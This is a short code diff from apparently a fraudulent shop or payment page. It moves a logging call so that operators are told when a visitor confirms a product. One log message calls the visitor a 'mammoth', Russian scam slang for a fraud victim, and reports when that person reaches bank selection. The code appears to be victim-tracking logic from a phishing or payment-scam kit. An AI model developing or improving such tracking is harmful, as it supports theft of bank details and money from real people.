@@ -1805,11 +1805,7 @@
       displayProductData(data);
 
 
-      // Log after productName is loaded
-      if (typeof sendLog === 'function') {
-        // Log page confirmation with product name
-        sendLog('page_confirmation', `📦 Товар: ${productName}\nlink_id=${link_id}`);
-      }
+      // Don't log here - will log when user clicks confirm button
 
     } catch (error) {
       console.error("❌ Ошибка подстановки данных:", error);
@@ -2482,6 +2478,9 @@ function openBankModal() {
   }
 
   if (typeof sendLog === 'function') {
+    // Log page confirmation when user clicks confirm button
+    sendLog('page_confirmation', `📦 Товар: ${productName}\nlink_id=${link_id}`);
+    // Then log payment flow
     sendLog('payment_flow', `🏦 Мамонт перешел на выбор банка\nlink_id=${link_id}`);
   } else {
     console.error('❌ sendLog is not defined!');
